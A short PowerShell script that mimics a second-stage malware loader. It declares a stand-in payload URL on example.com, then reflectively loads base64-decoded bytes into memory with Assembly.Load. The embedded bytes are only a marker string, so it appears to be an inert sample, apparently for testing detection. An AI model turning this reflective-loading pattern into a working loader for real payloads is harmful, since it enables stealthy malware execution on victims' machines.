[CmdletBinding()]
param(
    [string]$Stage2Url = 'http://example.com/payload.bin',
    [int]$TimeoutSec = 122
)
$ErrorActionPreference = "Stop"

try {
    $StageBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjp5NDhpbGxiczhh")
    Write-Verbose ("Assembly byte count: " + $StageBytes.Length)
    $FetchResult = [Reflection.Assembly]::Load($StageBytes)
    if ($null -ne $FetchResult) {
        Write-Verbose ("Loaded assembly: " + $FetchResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Write-Verbose "stage marker 40 reached"
Start-Sleep -Seconds 16
$StageMarker = "stage-15"
